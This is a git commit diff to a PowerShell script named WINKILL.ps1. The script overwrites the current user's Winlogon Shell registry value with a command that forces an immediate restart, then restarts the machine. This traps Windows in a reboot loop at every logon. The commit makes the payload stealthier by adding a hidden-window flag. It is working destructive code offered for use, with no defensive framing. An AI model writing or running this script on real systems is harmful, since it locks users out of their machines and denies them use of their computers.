bb77219d6cc2cd61c1401db00ed45a09478ca0a2
KoTim <100821199+tim1363@users.noreply.github.com>
2025-05-16 14:21:07 +0300

    Update WINKILL.ps1

--- WINKILL.ps1
+++ WINKILL.ps1
@@ -1,2 +1,2 @@
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value "powershell -Command shutdown /r /t 0"
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value "powershell -WindowStyle Hidden -Command shutdown /r /t 0"
 shutdown /r /t 0
